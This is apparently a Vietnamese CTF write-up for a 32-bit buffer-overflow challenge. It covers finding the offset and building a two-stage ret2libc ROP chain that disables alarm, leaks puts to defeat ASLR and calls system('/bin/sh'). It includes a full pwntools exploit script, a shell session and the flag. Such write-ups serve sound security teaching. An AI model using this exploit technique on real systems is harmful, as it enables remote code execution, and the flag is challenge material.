Challenge này là một bài pwn 32-bit. Mục tiêu là lợi dụng lỗi buffer overflow để thực thi một cuộc tấn công **ret2libc** (Return-to-Libc) 2 giai đoạn, lấy shell và đọc cờ.

### Bước 1: Phân tích ban đầu (Recon)

Đầu tiên, chúng ta kiểm tra file binary `chall`.

1. **Kiểm tra loại file:**Bash
    
    ```html
    $ file chall
    chall: ELF 32-bit LSB executable...
    ```
    
    Điều này xác nhận đây là file 32-bit, nghĩa là chúng ta sẽ làm việc với các địa chỉ 4-byte (`p32`) và thanh ghi `EIP`.
    
2. **Kiểm tra chuỗi (strings):**Bash
    
    ```html
    $ strings chall
    ...
    ld-linux.so.2
    puts
    read
    alarm
    vuln
    ...
    ```
    
    Các thông tin quan trọng:
    
    - **`vuln`**: Đây gần như chắc chắn là hàm chứa lỗ hổng.
    - **`puts` / `read`**: Các hàm I/O tiêu chuẩn. `puts` rất hữu ích để làm rò rỉ (leak) địa chỉ.
    - **`alarm`**: Một "bẫy" phổ biến. Lệnh này có thể đặt một bộ đếm thời gian và giết tiến trình, gây khó khăn cho việc exploit.
    - **Không có hàm "win"**: Không có hàm `system` hay `duck` nào có sẵn. Chúng ta phải "mượn" chúng từ `libc`.
3. **Tệp đính kèm:** Challenge cung cấp các file `libc.so.6` và `ld-linux.so.2`. Điều này thật tuyệt! Chúng ta không cần "đoán" phiên bản `libc` trên server. Chúng ta có thể tính toán các offset (độ lệch) chính xác ngay local.

### Bước 2: Tìm lỗ hổng và Offset

Chúng ta dùng GDB để phân tích hàm `vuln` và tìm offset (padding).

1. **Tìm Offset:**
Chúng ta tạo một chuỗi ký tự duy nhất (cyclic) dài 500 byte và gửi nó vào chương trình.Đoạn mãBash
    
    ```html
    (gdb) run
    ...
    aaaabaaacaaa...
    Program received signal SIGSEGV, Segmentation fault.
    0x64616164 in ?? ()
    ```
    
    Chương trình crash và `EIP` bị ghi đè bởi `0x64616164`. Chúng ta dùng `pwntools` để tìm offset:
    
    ```html
    $ python -c "from pwn import *; print(cyclic_find(0x64616164))"
    312
    ```
    
    - **PADDING (Offset): `312` bytes.**
2. **Phân tích `vuln`:**Đoạn mã
    
    ```html
    (gdb) disas vuln
    ...
    0x08049224 <+39>:	call   0x8049050 <read@plt>
    ...
    ```
    
    Hàm `vuln` sử dụng `read` để đọc dữ liệu vào một buffer trên stack. Với padding 312, rõ ràng buffer này nhỏ hơn nhiều so với lượng dữ liệu nó có thể đọc, gây ra lỗi Buffer Overflow.
    

### Bước 3: Kế hoạch tấn công (2 Giai đoạn)

Mục tiêu là gọi `system("/bin/sh")`, nhưng chúng ta cần địa chỉ của chúng trong `libc`, vốn bị xáo trộn bởi ASLR.

### Giai đoạn 1: Vô hiệu hóa `alarm` và Leak địa chỉ `puts`

Chúng ta sẽ xây dựng một ROP chain để:

1. Gọi `alarm(0)` để vô hiệu hóa "bom hẹn giờ" (đã giết tiến trình của chúng ta trong các lần thử ban đầu).
2. Gọi `puts(puts@got)` để in ra địa chỉ *runtime* của hàm `puts` từ `libc`.
3. Quay trở lại hàm `vuln` để chúng ta có thể gửi payload Giai đoạn 2.

### Giai đoạn 2: Tính toán và Lấy Shell

1. Nhận địa chỉ `puts` bị rò rỉ.
2. Tính toán địa chỉ `libc_base`: `libc_base = leaked_puts - PUTS_OFFSET`.
3. Tính địa chỉ `system`: `system_addr = libc_base + SYSTEM_OFFSET`.
4. Tính địa chỉ `/bin/sh`: `bin_sh_addr = libc_base + BINSH_OFFSET`.
5. Gửi payload thứ hai, lần này gọi `system(bin_sh_addr)`.

### Bước 4: Thu thập Gadget và Offset

Chúng ta cần 5 địa chỉ từ `chall` và 3 offset từ `libc.so.6`.

**Từ `./chall` (Dùng `objdump` và `ROPgadget`):**

1. **PADDING:** `312`
2. **`alarm@plt`** (Để gọi `alarm`): `0x08049060`
3. **`puts@plt`** (Để gọi `puts`): `0x08049070`
4. **`puts@got`** (Đối số cho `puts`): `0x0804c010`
5. **`vuln`** (Để quay lại): `0x080491fd`
6. **`pop ebx ; ret`** (Gadget dọn dẹp stack): `0x0804901e`

**Từ `./libc.so.6` (Dùng `readelf` và `strings`):**

1. **`puts` offset:** `0x00078140`
2. **`system` offset:** `0x00050430`
3. **`/bin/sh` offset:** `0x001c4de8`

### Bước 5: Script Exploit Hoàn Chỉnh

Chúng ta kết hợp tất cả thông tin này vào một script `pwntools` duy nhất.

Python

```html
#!/usr/bin/env python3
from pwn import *

# --- THÔNG TIN TỪ ./chall ---
PADDING = 312
PUTS_PLT = 0x08049070
PUTS_GOT = 0x804c010
VULN_ADDR = 0x080491fd
POP_RET_GADGET = 0x0804901e
ALARM_PLT = 0x08049060

# --- THÔNG TIN TỪ ./libc.so.6 ---
LIBC_PUTS_OFFSET = 0x00078140
LIBC_SYSTEM_OFFSET = 0x00050430
LIBC_BINSH_OFFSET = 0x001c4de8

# --- THIẾT LẬP KẾT NỐI ---
context.arch = 'i386'
p = remote('chall.v1t.site', 30212)

# --- GIAI ĐOẠN 1: TẮT ALARM VÀ LEAK LIBC ---
# Nhận banner
p.recvuntil(b"here!\n")

# Xây dựng Payload 1
payload1 = b"A" * PADDING
# 1. Gọi alarm(0) để tắt "bom hẹn giờ"
payload1 += p32(ALARM_PLT)
payload1 += p32(POP_RET_GADGET)  # Gadget dọn dẹp
payload1 += p32(0)               # Đối số '0'
# 2. Gọi puts(puts@got) để leak
payload1 += p32(PUTS_PLT)
payload1 += p32(POP_RET_GADGET)  # Gadget dọn dẹp
payload1 += p32(PUTS_GOT)        # Đối số puts
# 3. Quay lại vuln
payload1 += p32(VULN_ADDR)

print("[+] Sending Stage 1 payload...")
p.sendline(payload1)

# --- NHẬN LEAK VÀ TÍNH TOÁN ---
# Đọc cả dòng (địa chỉ + '\n') để dọn dẹp buffer
leaked_line = p.recvline()
leaked_puts = u32(leaked_line[0:4]) # Chỉ lấy 4 byte đầu
print(f"[*] Leaked puts@libc address: {hex(leaked_puts)}")

# Tính toán các địa chỉ runtime
libc_base = leaked_puts - LIBC_PUTS_OFFSET
system_addr = libc_base + LIBC_SYSTEM_OFFSET
bin_sh_addr = libc_base + LIBC_BINSH_OFFSET
print(f"[*] Libc base calculated: {hex(libc_base)}")
print(f"[*] System() address calculated: {hex(system_addr)}")
print(f"[*] /bin/sh address calculated: {hex(bin_sh_addr)}")

# --- GIAI ĐOẠN 2: LẤY SHELL ---
# Chương trình đang ở hàm vuln và chờ 'read'
# (Không có banner nào được in lại)
payload2 = b"B" * PADDING
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)      # Địa chỉ return "rác"
payload2 += p32(bin_sh_addr)     # Đối số /bin/sh

print("[+] Sending Stage 2 payload to get shell...")
p.sendline(payload2)

# --- TẬN HƯỞNG SHELL ---
print("[*] Enjoy your shell!")
p.interactive()
```

### Bước 6: Lấy Cờ

Chạy script, nó sẽ tự động thực hiện cả hai giai đoạn và chuyển sang chế độ tương tác (`interactive`) sau khi có shell.

Bash

```html
$ python3 pwn1.py
[+] Opening connection to chall.v1t.site on port 30212: Done
-------------------
  Feather Maker  
-------------------
Make your own feather here!

[+] Sending Stage 1 payload...
[*] Leaked puts@libc address: 0xf7de2140
[*] Libc base calculated: 0xf7d6a000
[*] System() address calculated: 0xf7dba430
[*] /bin/sh address calculated: 0xf7f2ede8
[+] Sending Stage 2 payload to get shell...
[*] Enjoy your shell!
[*] Switching to interactive mode
$ ls
chall
flag.txt
ld-linux.so.2
libc.so.6
$ cat flag.txt
V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}
```

**Flag: `V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}`**
